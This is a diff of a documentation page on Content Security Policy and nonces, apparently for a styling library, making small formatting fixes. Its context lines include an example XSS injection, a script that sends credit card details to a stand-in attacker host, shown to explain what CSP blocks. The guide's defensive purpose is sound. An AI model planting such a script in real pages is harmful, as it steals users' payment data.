@@ -9,7 +9,6 @@ Basically, CSP mitigates cross-site scripting (XSS) attacks by requiring develop
     <script>
       sendCreditCardDetails('https://hostile.example');
     </script>
-    
 
 This vulnerability would allow the attacker to execute anything. However, with a secure CSP header, the browser will not load this script.
 
@@ -30,8 +29,7 @@ const nonce = new Buffer(uuidv4()).toString('base64');
 It is very important you use UUID version 4, as it generates an **unpredictable** string. You then apply this nonce to the CSP header. A CSP header might look like this with the nonce applied:
 
 ```js
-header('Content-Security-Policy')
-  .set(`default-src 'self'; style-src: 'self' 'nonce-${nonce}';`);
+header('Content-Security-Policy').set(`default-src 'self'; style-src: 'self' 'nonce-${nonce}';`);
 ```
 
 If you are using Server Side Rendering (SSR), you should pass the nonce in the `<style>` tag on the server.
@@ -40,7 +38,7 @@ If you are using Server Side Rendering (SSR), you should pass the nonce in the `
 <style
   id="jss-server-side"
   nonce={nonce}
-  dangerouslySetInnerHTML={{ __html: sheetsRegistry.toString() } }
+  dangerouslySetInnerHTML={{ __html: sheetsRegistry.toString() }}
 />
 ```
 
